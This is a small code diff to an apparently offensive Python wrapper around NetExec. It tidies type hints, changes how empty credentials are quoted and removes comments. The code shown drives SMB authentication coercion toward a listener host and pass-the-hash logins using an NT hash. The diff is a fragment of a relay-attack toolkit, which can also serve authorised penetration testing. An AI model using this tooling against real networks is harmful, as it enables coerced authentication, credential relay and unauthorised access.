@@ -2,7 +2,7 @@
 from __future__ import annotations
 
 from pathlib import Path
-from typing import Any, Dict, List, Optional
+from typing import Dict, List, Optional
 
 from btc_module_relay_nxc_impckt_rspndr.config import AppConfig
 from btc_module_relay_nxc_impckt_rspndr.logger import get_logger
@@ -40,15 +40,14 @@ class NxcController:
         cmd = [
             "smb",
             target,
-            "-u", "''",
-            "-p", "''",
+            "-u", "",
+            "-p", "",
             "-M", "coerce_plus",
             "-o", options,
         ]
         logger.info(f"[nxc coerce_plus] {method or 'ALL'} -> {target} (listener={callback_host})")
         try:
             stdout = self._run(cmd)
-            # nxc coerce_plus prints "[+]" on successful coercion
             success = "[+]" in stdout
             return success, stdout
         except Exception as exc:
@@ -60,7 +59,7 @@ class NxcController:
         protocol: str,
         target: str,
         username: str,
-        nthash: str,
+        nthash: Optional[str],
         domain: str = ".",
         extra_args: Optional[List[str]] = None,
     ) -> tuple[bool, str]:
@@ -78,7 +77,6 @@ class NxcController:
         logger.info(f"[nxc post-auth] {protocol} {target} as {domain}\\{username}")
         try:
             stdout = self._run(cmd)
-            # nxc returns "[+]" on success, "[-]" on failure
             success = "[+]" in stdout
             return success, stdout
         except Exception as exc:
@@ -87,7 +85,6 @@ class NxcController:
 
     def _run(self, cmd: List[str]) -> str:
         volumes: Dict[str, Dict[str, str]] = {}
-        # If targets or wordlists exist in cwd, mount them read-only
         cwd = Path.cwd()
         volumes[str(cwd)] = {"bind": "/workspace", "mode": "ro"}
 
